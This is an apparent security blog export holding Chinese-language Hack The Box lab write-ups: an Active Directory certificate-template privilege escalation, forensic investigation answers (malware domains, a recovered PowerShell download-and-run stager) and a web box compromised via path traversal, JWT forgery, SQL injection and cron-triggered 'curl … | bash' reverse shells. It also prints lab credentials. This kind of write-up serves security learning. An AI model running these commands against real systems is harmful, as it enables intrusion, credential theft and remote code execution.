sql-Configuration.INI\r[OPTIONS]\rACTION=\u0026#34;Install\u0026#34;\rQUIET=\u0026#34;True\u0026#34;\rFEATURES=SQL\rINSTANCENAME=\u0026#34;SQLEXPRESS\u0026#34;\rINSTANCEID=\u0026#34;SQLEXPRESS\u0026#34;\rRSSVCACCOUNT=\u0026#34;NT Service\\ReportServer$SQLEXPRESS\u0026#34;\rAGTSVCACCOUNT=\u0026#34;NT AUTHORITY\\NETWORK SERVICE\u0026#34;\rAGTSVCSTARTUPTYPE=\u0026#34;Manual\u0026#34;\rCOMMFABRICPORT=\u0026#34;0\u0026#34;\rCOMMFABRICNETWORKLEVEL=\u0026#34;\u0026#34;0\u0026#34;\rCOMMFABRICENCRYPTION=\u0026#34;0\u0026#34;\rMATRIXCMBRICKCOMMPORT=\u0026#34;0\u0026#34;\rSQLSVCSTARTUPTYPE=\u0026#34;Automatic\u0026#34;\rFILESTREAMLEVEL=\u0026#34;0\u0026#34;\rENABLERANU=\u0026#34;False\u0026#34; SQLCOLLATION=\u0026#34;SQL_Latin1_General_CP1_CI_AS\u0026#34;\rSQLSVCACCOUNT=\u0026#34;SEQUEL\\sql_svc\u0026#34;\rSQLSVCPASSWORD=\u0026#34;WqSZAF6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\u0026#34;\rSQLSYSADMINACCOUNTS=\u0026#34;SEQUEL\\Administrator\u0026#34;\rSECURITYMODE=\u0026#34;SQL\u0026#34;\rSAPWD=\u0026#34;MSSQLP@ssw0rd!\u0026#34;\rADDCURRENTUSERASSQLADMIN=\u0026#34;False\u0026#34;\rTCPENABLED=\u0026#34;1\u0026#34;\rNPENABLED=\u0026#34;1\u0026#34;\rBROWSERSVCSTARTUPTYPE=\u0026#34;Automatic\u0026#34;\rIAcceptSQLServerLicenseTerms=True\rPS C:\\SQL2019\\ExpressAdv_ENU\u0026gt; 使用这个密码可以登录ryan的账户获取到user.txt\nPrivilege Escalation #\r在Evil-winrm里查看ipconfig\n把sequel.htb和dc01.seqeul.htb添加到**/etc/hosts**\nBloodhound #\r[root@kali] /home/kali/EscapeTwo ❯ bloodhound-python -u ryan -p \u0026#34;WqSZAFXXXXXXXX\u0026#34; -d sequel.htb -ns 10.10.xx.xx -c All\rINFO: Found AD domain: sequel.htb\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\rINFO: Connecting to LDAP server: dc01.sequel.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.sequel.htb\rINFO: Found 10 users\rINFO: Found 59 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.sequel.htb\rINFO: Done in 00M 16S Ryan对CA_SVC具有WriteOwner权限\n并且CA_SVC是证书发布者\n因此可以将CA_SVC的拥有者设置为Ryan\nSet Owner #\r[root@kali] /home/kali/EscapeTwo ❯ bloodyAD --host \u0026#39;10.10.XX.XX\u0026#39; -d \u0026#39;escapetwo.htb\u0026#39; -u \u0026#39;ryan\u0026#39; -p \u0026#39;WqSZAF6XXXXXXXX\u0026#39; set owner \u0026#39;ca_svc\u0026#39; \u0026#39;ryan\u0026#39; ⏎\r[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc Get Control Rights #\rGrant rights | The Hacker Recipes [root@kali] /home/kali/EscapeTwo ❯ impacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; \u0026#39;sequel.htb\u0026#39;/\u0026#34;ryan\u0026#34;:\u0026#34;WqSZAFXXXXXXXXXXX\u0026#34; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] DACL modified successfully! ESC4 to ESC1 #\rAD CS 域升级 - HackTricks 获取影子凭证（Shadow Credentials），以及NThash\n[root@kali] /home/kali/EscapeTwo ❯ certipy-ad shadow auto -u \u0026#39;ryan@sequel.htb\u0026#39; -p \u0026#34;WqSZAXXXXXXX\u0026#34; -account \u0026#39;ca_svc\u0026#39; -dc-ip \u0026#39;10.10.XX.XX\u0026#39;\r####you will get NThash of ca_svc below\r[*] NT hash for \u0026#39;ca_svc\u0026#39;: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 如果遇到了下面的错误👇需要手动更新时间\n[root@kali] /home/kali/EscapeTwo ❯ ntpdate sequel.htb 查找能用的模板，我们需要覆盖他的设置\n我这里使用的是Certify.exe上传到目标机器上\n*Evil-WinRM* PS C:\\temp\u0026gt; ./Certify.exe find /domain:sequel.htb 可以看到ca_svc对这个证书具有可覆盖权限👆，下面将其覆盖\n[root@kali] /home/kali/EscapeTwo ❯ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.XX.XX -target dc01.sequel.htb\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Updating certificate template \u0026#39;DunderMifflinAuthentication\u0026#39;\r[*] Successfully updated \u0026#39;DunderMifflinAuthentication\u0026#39; 利用 ca_svc 用户的凭证哈希，通过 Kerberos 请求来获得目标系统的身份验证票证\n[root@kali] /home/kali/EscapeTwo ❯ certipy-ad req -u ca_svc -hashes \u0026#39;XXXXXXXXXXXXXXXXXXXXXXXX\u0026#39; -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.xx.xx -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.xx.xx -dns 10.10.xx.xx -debug\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[+] Trying to resolve \u0026#39;sequel.htb\u0026#39; at \u0026#39;10.10.xx.xx\u0026#39;\r[+] Generating RSA key\r[*] Requesting certificate via RPC\r[+] Trying to connect to endpoint: ncacn_np:10.10.xx.xx[\\pipe\\cert]\r[+] Connected to endpoint: ncacn_np:10.10.xx.xx[\\pipe\\cert]\r[*] Successfully requested certificate\r[*] Request ID is 6\r[*] Got certificate with multiple identifications\rUPN: \u0026#39;administrator@sequel.htb\u0026#39;\rDNS Host Name: \u0026#39;10.10.xx.xx\u0026#39;\r[*] Certificate has no object SID\r[*] Saved certificate and private key to \u0026#39;administrator_10.pfx\u0026#39; 通过证书获取到Administrator的hash\n[root@kali] /home/kali/EscapeTwo ❯ certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Found multiple identifications in certificate\r[*] Please select one:\r[0] UPN: \u0026#39;administrator@sequel.htb\u0026#39;\r[1] DNS Host Name: \u0026#39;10.10.XX.XX\u0026#39;\r\u0026gt; 0\r[*] Using principal: administrator@sequel.htb\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39;\r[*] Got hash for \u0026#39;administrator@sequel.htb\u0026#39;: aad3b435bxxxxxxxxxxx:7a8d4e0xxxxxxxxxxxxxxxxxxxxxxxx Evil-Winrm登录拿到root.txt\n[root@kali] /home/kali/EscapeTwo ❯ evil-winrm -i 10.10.xx.xx -u \u0026#34;administrator\u0026#34; -H \u0026#34;7a8d4e049XXXXXXXXXXXXXXXXXX\u0026#34; Summary #\rUser：SMB的表格文件泄露了账号和密码，可以用于登录MSSQL服务，手动打开XP_CMDSHELL就可以进行命令执行，这与我之前工程实践的一个靶机类似。找到了SQL服务的一个配置文件里面保存有密码，可以进行Ryan用户的登录，拿到User.txt.\nRoot：通过Ryan用户使用Bloodhound进行分析，发现Ryan对CA_SVC具有WriteOwner权限。可以将Ryan作为CA_SVC的拥有者，我尝试过修改CA_SVC的密码，但是似乎密码并不能被修改，报错说密码的修改冷却是-2 days。不过可以拿到CA_SVC的影子票据进行ESC4的操作，使用-k参数指定Kerberos认证。过程中可能会出现各种报错，一定要尝试使用ntpdate sequel.htb 同步时区，其余的可能是网络问题。\n","date":"2025-01-12","externalUrl":null,"permalink":"/posts/2025/01/htb-escapetwo/","section":"Posts","summary":"","title":"HTB-EscapeTwo","type":"posts"},{"content":"","date":"2025-01-04","externalUrl":null,"permalink":"/categories/htb-sherlock/","section":"Categories","summary":"","title":"Htb-Sherlock","type":"categories"},{"content":"\rSherlock Scenario #\r我们在网络活动中发现了一个异常模式，表明可能存在安全漏洞。我们的团队怀疑我们的系统遭到未经授权的入侵，可能会泄露敏感数据。您的任务是调查此事件。\nTask1 #\rVBS 脚本是从哪个域下载的？\n在最开始的DNS包里面发现了escuelademarina.com，并且下面的SMB包里也存在一个AZURE_DOC_OPEN.vbs\nTask2 #\r与问题 #1 中的域关联的 IP 地址用于此攻击？\n从问题1中DNS包里可以看到IP是165.22.16.55\nTask3 #\r用于初始访问的 VBS 脚本的文件名是什么？\n问题1中的AZURE_DOC_OPEN.vbs\nTask4 #\r用于获取 PowerShell 脚本的 URL 是什么？\n尝试导出SMB包\n将第60个分组的data字段复制下来进行十六进制转码\n得到目标URL：badbutperfect.com/nrwncpwo\nTask5 #\r什么可能的合法二进制文件被下载到受害者机器上？\n导出HTTP的对象，查看第75个分组\n得到AutoHotKey.exe\nTask6 #\r与问题 #5 中的二进制文件一起使用的恶意软件是从哪个 URL 下载的？\n一起使用的就是图中的http://badbutperfect.com/jvtobaqj\nTask7 #\r问题 #6 中的恶意软件在磁盘上给出的文件名是什么？\n图中有script.ahk\nTask8 #\r恶意软件的 TLSH 是多少？\n将软件导出，并且上传到：VirusTotal - Home\nTLSH：T15E430A36DBC5202AD8E3074270096562FE7DC0215B4B32659C9EF16835CF6FF9B6A1B8\nTask9 #\r这个恶意软件叫什么名字？使用 McAfee、Ikarus 和 alejandro.sanchez 使用的名称。\nDarkGate\nTask10 #\r受感染机器的 user-agent 字符串是什么？\n进入到HTTP包里查看\nUA：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\nTask11 #\r上一个问题中的 RAT 连接到哪个 IP？\n103.124.105.78\n","date":"2025-01-04","externalUrl":null,"permalink":"/posts/2025/01/sherlocks-takedown/","section":"Posts","summary":"","title":"Sherlocks-Takedown","type":"posts"},{"content":"","date":"2025-01-04","externalUrl":null,"permalink":"/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","section":"Tags","summary":"","title":"日志分析","type":"tags"},{"content":"\rSherlock Scenario #\r在这个 Sherlock 中，您将熟悉 **MFT（主文件表）**取证。您将了解用于分析 MFT 工件以识别恶意活动的知名工具和方法。在我们的分析过程中，您将使用 MFTECmd 工具解析提供的 MFT 文件，使用 TimeLine Explorer 打开并分析解析的 MFT 的结果，并使用十六进制编辑器从 MFT 中恢复文件内容。\nPreparing #\r将MFT文件转为CSV文件需要用到下面这个工具\n我是在Windows环境下使用的，需要将CMD右键设置为管理员使用\n使用下面这个工具来进行阅读CSV文件\nTimeline Explorer | SANS Institute Task1 #\rSimon Stark 于 2 月 13 日成为攻击者的目标。他从电子邮件中收到的链接下载了一个 ZIP 文件。他从链接下载的 ZIP 文件的名称是什么？\n查询文件名中包含.zip，然后包含http字样的行，发现一个压缩包文件\nStage-20240213T093324Z-001.zip\nTask2 #\r检查最初下载的 ZIP 文件的 Zone Identifier 内容。此字段显示下载文件的 HostUrl，在我们的调查/分析中用作有价值的入侵指标 （IOC）。下载此 ZIP 文件的完整主机 URL 是什么？\n对应的完整URL是\nhttps://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser Task3 #\r执行恶意代码并连接到 C2 服务器的恶意文件的完整路径和名称是什么？\n尝试搜索压缩包解压后的路径\n发现一个可疑的bat文件\n恶意文件的完整路径\nC:\\Users\\simon.stark\\Downloads\\Stage-20240213T093324Z-001\\Stage\\invoice\\invoices\\invoice.bat Task4 #\r分析之前标识的文件的 $Created 0x30 时间戳。这个文件是什么时候在磁盘上创建的？\n查找invoice.bat的创建时间：2024-02-13 16:38:39\nTask5 #\r在许多调查场景中，查找 MFT 记录的十六进制偏移量是有益的。从问题 3 中找到 stager 文件的十六进制偏移量。\n查询文件的Entry Number为23436\n将其乘以1024（这是每一条记录的大小）然后转为十六进制\n偏移量为：16E3000\nTask6 #\r每个 MFT 记录的大小为 1024 字节。如果磁盘上的文件大小小于 1024 字节，则可以直接存储在 MFT 文件本身上。这些文件称为 MFT 驻留文件。在 Windows 文件系统调查期间，查找可能驻留在 MFT 中的任何恶意/可疑文件至关重要。这样我们就可以找到恶意文件/脚本的内容。找到问题 3 中发现的恶意暂存程序的内容，并使用 C2 IP 和端口回答。\n因为我们已经有了偏移量，因此可以使用任意十六进制编辑器打开$MFT文件，我这里使用的是HxD\n跳转到偏移量的位置往下一点，能发现驻留在文件中的恶意代码内容\n大致内容如下，直接复制过来有一些空字符会看不见\n@echo off\rstart /b powershell.exe -nol -w 1 -nop -ep bypass \u0026#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\u0026#39;http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGF\u0003�W9uIGV0dw==\u0026#39;) -UseBasicParsing|iex\u0026#34;\r(goto) 2\u0026gt;nul \u0026amp; del \u0026#34;%~f0\u0026#34;\r= ","date":"2024-12-28","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-bft/","section":"Posts","summary":"","title":"Sherlocks-BFT","type":"posts"},{"content":"\rSherlock Scenario #\r在本 Sherlock 中，您将熟悉 Sysmon 日志和各种有用的 EventID，用于识别和分析 Windows 系统上的恶意活动。Palo Alto 的 Unit42 最近对 UltraVNC 活动进行了研究，其中攻击者利用 UltraVNC 的后门版本来维护对系统的访问。此实验室受该活动的启发，指导参与者完成活动的初始访问阶段。\nTask1 #\r有多少个事件 ID 为 11 的事件日志？\n筛选日志ID，得到数量是：56\nTask2 #\r每当在内存中创建进程时，都会记录事件 ID 为 1 的事件，其中包含命令行、哈希、进程路径、父进程路径等详细信息。此信息对分析师非常有用，因为它使我们能够查看系统上执行的所有程序，这意味着我们可以发现正在执行的任何恶意进程。感染受害者系统的恶意进程是什么？\n筛选日志ID为1的日志进行查看\n恶意进程：C:\\Users\\CyberJunkie\\Downloads\\Preventivo24.02.14.exe.exe\nTask3 #\r哪个云驱动器用于分发恶意软件？\n查询事件ID为22，发现一个可疑的链接\n搜索dropboxusercontent得到云驱动器是dropbox\nTask4 #\r对于它写入磁盘的许多文件，最初的恶意文件使用了一种称为 Time Stomping 的防御规避技术，其中文件创建日期被更改以使其看起来更旧并与其他文件混合。PDF 文件的时间戳更改为什么？\n搜索PDF，在ID为2的事件中发现事件修改\n时间是：2024-01-14 08:10:06\nTask5 #\r恶意文件在磁盘上放置了一些文件。“once.cmd”是在磁盘上的什么地方创建的？请回答完整路径和文件名。\n搜索once，在ID为11的事件中找到路径\nTask6 #\r恶意文件试图访问虚拟域，很可能检查 Internet 连接状态。它尝试连接到哪个域名？\n在ID为22的日志中发现域名\nTask7 #\r恶意进程试图联系哪个 IP 地址？\nID为3的日志记录与IP相关的东西\nIP地址为：93.184.216.34\nTask8 #\r恶意进程在用 UltraVNC 的后门变体感染 PC 后自行终止。进程何时自行终止？\n搜索VNC得到ID为2的事件\n终止时间为：2024-02-14 03:41:58\n","date":"2024-12-25","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-unit42/","section":"Posts","summary":"","title":"Sherlocks-Unit42","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Yummy ❯ nmap yummy.htb -sSCV -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 16:55 CST\rNmap scan report for yummy.htb (10.10.11.36)\rHost is up (0.095s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)\r|_ 256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)\r80/tcp open http Caddy httpd\r|_http-title: Yummy\r|_http-server-header: Caddy\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 11.45 seconds 开放端口：22、80\nDirsearch #\r[root@kali] /home/kali/Yummy ❯ dirsearch -u yummy.htb -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545\rOutput File: /home/kali/Yummy/reports/_yummy.htb/_24-12-23_16-33-48.txt\rTarget: http://yummy.htb/\r[16:33:48] Starting: [16:33:50] 200 - 8KB - /register [16:33:50] 200 - 7KB - /login [16:33:52] 302 - 199B - /logout -\u0026gt; /login [16:33:55] 302 - 199B - /dashboard -\u0026gt; /login Task Completed DownloadBackups #\r进入网页先注册用户然后登录。\n然后进入BOOK A TABLE，随便输入信息然后提交\n然后回到Dashborad，有一个下载链接，使用Burpsuite进行抓包\n第一个GET请求的reminder直接放行\n如果遇到服务器报错500，需要重新抓包发送到repeater。\n第二个包发送到Repeater，修改URL参数，可以读取/etc/passwd\n并且在其中发现了两个存在的用户：dev、qa\n并且能读到一些Caddy服务器的配置\n但是没有其他的配置文件或者SSH密钥能够直接读取，但是读取定时任务的时候发现了一个类似于文件备份的脚本\n读取这个app_backup.sh，发现目录下存在源码备份文件\n直接下载这个文件\nGET /export/../../../../../var/www/backupapp.zip HTTP/1.1 读取里面的app.py，发现数据库密码泄露\n[root@kali] /home/kali/Yummy/opt/app ❯ cat app.py from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response\rimport tempfile\rimport os\rimport shutil\rfrom datetime import datetime, timedelta, timezone\rfrom urllib.parse import quote\rfrom ics import Calendar, Event\rfrom middleware.verification import verify_token\rfrom config import signature\rimport pymysql.cursors\rfrom pymysql.constants import CLIENT\rimport jwt\rimport secrets\rimport hashlib\rapp = Flask(__name__, static_url_path=\u0026#39;/static\u0026#39;)\rtemp_dir = \u0026#39;\u0026#39;\rapp.secret_key = secrets.token_hex(32)\rdb_config = {\r\u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;,\r\u0026#39;user\u0026#39;: \u0026#39;chef\u0026#39;,\r\u0026#39;password\u0026#39;: \u0026#39;3wDo7gSRZIwIHRxZ!\u0026#39;,\r\u0026#39;database\u0026#39;: \u0026#39;yummy_db\u0026#39;,\r\u0026#39;cursorclass\u0026#39;: pymysql.cursors.DictCursor,\r\u0026#39;client_flag\u0026#39;: CLIENT.MULTI_STATEMENTS\r}\raccess_token = \u0026#39;\u0026#39;\r................\r................ JWT Token #\r在config里发现了一个RSA密钥生成的脚本\n#!/usr/bin/python3\rfrom Crypto.PublicKey import RSA\rfrom cryptography.hazmat.backends import default_backend\rfrom cryptography.hazmat.primitives import serialization\rimport sympy\r# Generate RSA key pair\rq = sympy.randprime(2**19, 2**20)\rn = sympy.randprime(2**1023, 2**1024) * q\re = 65537\rp = n // q\rphi_n = (p - 1) * (q - 1)\rd = pow(e, -1, phi_n)\rkey_data = {\u0026#39;n\u0026#39;: n, \u0026#39;e\u0026#39;: e, \u0026#39;d\u0026#39;: d, \u0026#39;p\u0026#39;: p, \u0026#39;q\u0026#39;: q}\rkey = RSA.construct((key_data[\u0026#39;n\u0026#39;], key_data[\u0026#39;e\u0026#39;], key_data[\u0026#39;d\u0026#39;], key_data[\u0026#39;p\u0026#39;], key_data[\u0026#39;q\u0026#39;]))\rprivate_key_bytes = key.export_key()\rprivate_key = serialization.load_pem_private_key(\rprivate_key_bytes,\rpassword=None,\rbackend=default_backend()\r)\rpublic_key = private_key.public_key() 将JWTtoken拿去解密可以看到在Payload中泄露了大整数n和e的数值\n根据**RSA**算法可知，p和q是n的两个素因子，可以使用库函数对n进行分解，下面的完整的脚本\nimport base64\rimport json\rimport jwt\rfrom Crypto.PublicKey import RSA\rfrom cryptography.hazmat.backends import default_backend\rfrom cryptography.hazmat.primitives import serialization\rimport sympy\r#enter your jwt token here\rtoken = \u0026#34;\u0026#34;\rjs = json.loads(base64.b64decode( token.split(\u0026#34;.\u0026#34;)[1] + \u0026#34;===\u0026#34;).decode())\rn= int(js[\u0026#34;jwk\u0026#34;][\u0026#39;n\u0026#39;])\rp,q= list((sympy.factorint(n)).keys()) #divide n\re=65537\rphi_n = (p-1)*(q-1)\rd = pow(e, -1, phi_n)\rkey_data = {\u0026#39;n\u0026#39;: n, \u0026#39;e\u0026#39;: e, \u0026#39;d\u0026#39;: d, \u0026#39;p\u0026#39;: p, \u0026#39;q\u0026#39;: q}\rkey = RSA.construct((key_data[\u0026#39;n\u0026#39;], key_data[\u0026#39;e\u0026#39;], key_data[\u0026#39;d\u0026#39;], key_data[\u0026#39;p\u0026#39;], key_data[\u0026#39;q\u0026#39;]))\rprivate_key_bytes = key.export_key()\rprivate_key = serialization.load_pem_private_key(\rprivate_key_bytes,\rpassword=None,\rbackend=default_backend()\r)\rpublic_key = private_key.public_key()\rdata = jwt.decode(token, public_key, algorithms=[\u0026#34;RS256\u0026#34;] )\rdata[\u0026#34;role\u0026#34;] = \u0026#34;administrator\u0026#34;\r# Create new admin token new_token = jwt.encode(data, private_key, algorithm=\u0026#34;RS256\u0026#34;)\rprint(new_token) 替换新的Token之后进入到了admindashboard\nSQL Injection #\r检查源码，在参数order_query中没有进行任何过滤\n@app.route(\u0026#39;/admindashboard\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef admindashboard():\rvalidation = validate_login()\rif validation != \u0026#34;administrator\u0026#34;:\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\rtry:\rconnection = pymysql.connect(**db_config)\rwith connection.cursor() as cursor:\rsql = \u0026#34;SELECT * from appointments\u0026#34;\rcursor.execute(sql)\rconnection.commit()\rappointments = cursor.fetchall()\rsearch_query = request.args.get(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)\r# added option to order the reservations\rorder_query = request.args.get(\u0026#39;o\u0026#39;, \u0026#39;\u0026#39;)\rsql = f\u0026#34;SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}\u0026#34;\rcursor.execute(sql, (\u0026#39;%\u0026#39; + search_query + \u0026#39;%\u0026#39;,))\rconnection.commit()\rappointments = cursor.fetchall()\rconnection.close() 并且通过union注入我发现存在报错注入的可能性\n尝试使用Extractvalue报错引出User\nhttp://yummy.htb/admindashboard?s=edu\u0026amp;o=ASC;select extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;))) 不过似乎并不能查到里面的password\n数据库的secure_file_priv被设置为了空，不是NULL，可能存在文件写入into outfile\n回到之前的定时任务，里面存在一个mysql的定时任务会执行一个dbmonitor.sh\n通过任意文件下载得到dbmonitor.sh\n#!/bin/bash\rtimestamp=$(/usr/bin/date)\rservice=mysql\rresponse=$(/usr/bin/systemctl is-active mysql)\rif [ \u0026#34;$response\u0026#34; != \u0026#39;active\u0026#39; ]; then\r/usr/bin/echo \u0026#34;{\\\u0026#34;status\\\u0026#34;: \\\u0026#34;The database is down\\\u0026#34;, \\\u0026#34;time\\\u0026#34;: \\\u0026#34;$timestamp\\\u0026#34;}\u0026#34; \u0026gt; /data/scripts/dbstatus.json\r/usr/bin/echo \u0026#34;$service is down, restarting!!!\u0026#34; | /usr/bin/mail -s \u0026#34;$service is down!!!\u0026#34; root\rlatest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2\u0026gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)\r/bin/bash \u0026#34;$latest_version\u0026#34;\relse\rif [ -f /data/scripts/dbstatus.json ]; then\rif grep -q \u0026#34;database is down\u0026#34; /data/scripts/dbstatus.json 2\u0026gt;/dev/null; then\r/usr/bin/echo \u0026#34;The database was down at $timestamp. Sending notification.\u0026#34;\r/usr/bin/echo \u0026#34;$service was down at $timestamp but came back up.\u0026#34; | /usr/bin/mail -s \u0026#34;$service was down!\u0026#34; root\r/usr/bin/rm -f /data/scripts/dbstatus.json\relse\r/usr/bin/rm -f /data/scripts/dbstatus.json\r/usr/bin/echo \u0026#34;The automation failed in some way, attempting to fix it.\u0026#34;\rlatest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2\u0026gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)\r/bin/bash \u0026#34;$latest_version\u0026#34;\rfi\relse\r/usr/bin/echo \u0026#34;Response is OK.\u0026#34;\rfi\rfi\r[ -f dbstatus.json ] \u0026amp;\u0026amp; /usr/bin/rm -f dbstatus.json MySQL 服务活跃时的处理：\n如果 MySQL 服务 活跃，且 /data/scripts/dbstatus.json 文件存在： 如果 dbstatus.json 文件内容中包含 \u0026ldquo;database is down\u0026rdquo;，说明数据库之前出现过故障，发送恢复通知，并删除状态文件： /usr/bin/echo \u0026#34;$service was down at $timestamp but came back up.\u0026#34; | /usr/bin/mail -s \u0026#34;$service was down!\u0026#34; root\r/usr/bin/rm -f /data/scripts/dbstatus.json 如果 dbstatus.json 文件内容未包含 \u0026ldquo;database is down\u0026rdquo;，则认为自动化过程失败，重新执行最新的修复脚本： /usr/bin/echo \u0026#34;The automation failed in some way, attempting to fix it.\u0026#34;\rlatest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2\u0026gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)\r/bin/bash \u0026#34;$latest_version\u0026#34; 看到有一个/data/scripts/fixer-v*，由于这里存在一个通配符，并且配合我们之前猜测可以进行Mysql写入文件，可以尝试写入一个包含bash脚本的一个文件然后等待定时任务被执行，监听反弹Shell\n# /etc/crontab: system-wide crontab\r# Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39;\r# command to install the new version when you edit this file\r# and files in /etc/cron.d. These files also have username fields,\r# that none of the other crontabs do.\rSHELL=/bin/sh\r# You can also override PATH, but by default, newer versions inherit it from the environment\r#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r# Example of job definition:\r# .---------------- minute (0 - 59)\r# | .------------- hour (0 - 23)\r# | | .---------- day of month (1 - 31)\r# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...\r# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\r# | | | | |\r# * * * * * user-name command to be executed\r17 *\t* * *\troot\tcd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly\r25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily; }\r47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly; }\r52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly; }\r#\r*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh\r*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh\r* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh 在/etc/crontab中发现，mysql每一分钟会执行一次执行dbmonitor.sh\n首先要写入json文件，然后再写入一个符合正则匹配的脚本\n#1\rselect+\u0026#34;curl+10.10.xx.xx/rev.sh+|bash;\u0026#34;+INTO+OUTFILE++\u0026#39;/data/scripts/dbstatus.json\u0026#39;; #2\rselect+\u0026#34;curl+10.10.xx.xx/rev.sh+|bash;\u0026#34;+INTO+OUTFILE++\u0026#39;/data/scripts/fixer-v___\u0026#39;; User #\r在定时任务里面可以注意到，除了mysql还有一个www-data的定时任务，因此可以将一个**反弹Shell**重命名为app_backup.sh等待www-data去执行\nmysql@yummy:/data/scripts$ wget 10.10.xx.xx/rev2.sh\rmysql@yummy:/data/scripts$ mv app_backup.sh app_backup_old.sh\rmv app_backup.sh app_backup_old.sh\rmysql@yummy:/data/scripts$ mv rev2.sh app_backup.sh\rmv rev2.sh app_backup.sh\rmysql@yummy:/data/scripts$ ls\rls\rapp_backup_old.sh\rapp_backup.sh\rdbmonitor.sh\rfixer-v1.0.1.sh\rsqlappointments.sql\rtable_cleanup.sh 在/var/www/app-qatesting/目录下发现一个隐藏的文件夹/.hg\n读取二进制文件app.py.i，发现泄露的密码\nuser: qa\rpassword: jPAd!XQCtn8Oc@2B SSH登录拿到User.txt\nPrivilege Escalation #\rSudo -l查看当前用户命令\nqa@yummy:~$ sudo -l\rMatching Defaults entries for qa on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser qa may run the following commands on localhost:\r(dev : dev) /usr/bin/hg pull /home/dev/app-production/ 可以看到qa用户可以以dev身份进行拉取仓库\n查看这个hg的配置文件\nqa@yummy:~$ cat 